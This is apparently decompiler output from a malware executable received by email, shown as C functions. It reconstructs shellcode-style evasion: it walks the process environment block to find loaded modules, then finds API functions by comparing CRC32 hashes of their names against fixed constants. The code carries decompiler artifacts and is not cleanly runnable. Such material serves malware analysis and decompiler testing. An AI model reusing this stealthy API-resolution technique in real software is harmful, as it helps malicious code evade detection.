// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1246/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 eax, word32 edx, word32 ebp, byte cl, selector fs)
{
	fn00401018();
	word32 ebx_30 = DPB(dwLoc14, 0x0000, 0, 16);
	word32 eax_34 = ebx_30 + Mem0[ebx_30 + 0x0000003C:word32];
	word32 edx_37 = (word32) Mem0[eax_34 + 0x00000014:word16] + eax_34;
	word32 eax_46 = Mem0[edx_37 + 0x0000004C:word32] + ebx_30;
	byte bl_62;
	word32 eax_63 = fn004010B5(fs, 0xCEF2EDA8, out bl_62);
	eax_63();
	if (eax_63 == 0x00000000)
	{
		Mem96[fp - 0x00000020:word32] = 0x10066F2F;
		byte bl_97;
		word32 eax_98 = fn004010B5(fs, 0xCEF2EDA8, out bl_97);
		Mem101[fp - 0x00000020:word32] = fp - 0x00000020;
		eax_98();
		0x00000040();
		word32 dwLoc2C_107 = Mem101[edx_37 + 0x00000048:word32];
		fn00401076(dwLoc2C_107, eax_46 + 0x00000947);
		return;
	}
	else
	{
		fn00401018();
		return;
	}
}

void fn00401018()
{
	return;
}

word32 fn00401076(word32 dwArg04, word32 dwArg08)
{
	word32 edx_31 = dwArg04;
	word32 ecx_105 = dwArg08;
	if (dwArg08 == 0x00000000)
	{
		word32 edi_102 = dwArg04;
		do
		{
			edi_102 = edi_107 + 0x00000001;
			word32 edi_107 = edi_102;
		} while (0x00 != Mem0[edi_107 + 0x00000000:byte]);
		ecx_105 = edi_102 - 0x00000001 - dwArg04;
	}
	word32 eax_40 = ~0x00000000;
	byte al_41 = (byte) eax_40;
	do
	{
		eax_40 = DPB(eax_40, al_41 ^ Mem0[edx_31 + 0x00000000:byte], 0, 8);
		edx_31 = edx_31 + 0x00000001;
		byte bl_55 = 0x08;
		do
		{
			eax_40 = eax_40 >>u 0x00000001;
			al_41 = (byte) eax_40;
			if (eax_40 <u 0x00000000)
			{
				eax_40 = eax_40 ^ 0xEDB88320;
				al_41 = (byte) (eax_40 ^ 0xEDB88320);
			}
			bl_55 = bl_55 - 0x01;
		} while (bl_55 != 0x00);
		ecx_105 = ecx_105 - 0x00000001;
	} while (ecx_105 != 0x00000000);
	return ~eax_40;
}

word32 fn004010B5(selector fs, word32 dwArg04, ptr32 blOut)
{
	word32 edx_34 = Mem0[Mem0[Mem0[fs:0x00000030:word32] + 0x0000000C:word32] + 0x0000000C:word32];
	do
	{
		edx_34 = Mem0[edx_34 + 0x00000000:word32];
		word32 edi_54 = fp - 0x0000001D;
		word32 esi_55 = Mem0[edx_34 + 0x00000030:word32];
		word32 ecx_181 = 0x0000000D;
		do
		{
			word16 ax_60 = Mem0[esi_55 + 0x00000000:word16];
			Mem63[edi_54 + 0x00000000:byte] = (byte) ax_60;
			esi_55 = esi_55 + 0x00000002;
			edi_54 = edi_54 + 0x00000001;
			if (ax_60 == 0x0000)
				break;
			ecx_181 = ecx_181 - 0x00000001;
		} while (ecx_181 != 0x00000000);
		word32 ecx_69 = 0x0000000D;
		word32 esi_70 = fp - 0x0000001D;
		word32 edi_71 = fp - 0x0000001D;
		do
		{
			byte al_177 = Mem63[esi_70 + 0x00000000:byte];
			esi_70 = esi_70 + 0x00000001;
			if (al_177 <=u 0x5A && al_177 >=u 0x41)
				al_177 = al_177 + 0x20;
			Mem89[edi_71 + 0x00000000:byte] = al_177;
			edi_71 = edi_71 + 0x00000001;
			ecx_69 = ecx_69 - 0x00000001;
		} while (ecx_69 != 0x00000000);
		Mem93[fp + 0xFFFFFFB8:word32] = 0x00000000;
	} while ((fn00401076(fp - 0x0000001D, dwLoc48) ^ 0x6AE69F02) != 0x00000000);
	word32 eax_104 = Mem93[edx_34 + 0x00000018:word32];
	word32 esi_111 = Mem93[eax_104 + Mem93[eax_104 + 0x0000003C:word32] + 0x00000078:word32] + eax_104 + 0x0000001C;
	word32 edi_112 = fp - 0x00000010;
	word32 ecx_113 = 0x00000003;
	do
	{
		Mem121[edi_112 + 0x00000000:word32] = Mem93[esi_111 + 0x00000000:word32] + eax_104;
		esi_111 = esi_111 + 0x00000004;
		edi_112 = edi_112 + 0x00000004;
		ecx_113 = ecx_113 - 0x00000001;
	} while (ecx_113 != 0x00000000);
	word32 esi_125 = dwLoc0C;
	word32 edx_126 = 0xFFFFFFFF;
	do
	{
		word32 eax_132 = Mem121[esi_125 + 0x00000000:word32] + eax_104;
		Mem135[fp + 0xFFFFFFB8:word32] = 0x00000000;
		edx_126 = edx_126 + 0x00000001;
		esi_125 = esi_125 + 0x00000004;
	} while (dwArg04 != fn00401076(eax_132, dwLoc48));
	byte bl_162;
	*blOut = (byte) ebx;
	return dwLoc10[(word32) dwLoc08[edx_126 * 0x00000002] * 0x00000004] + eax_104;
}

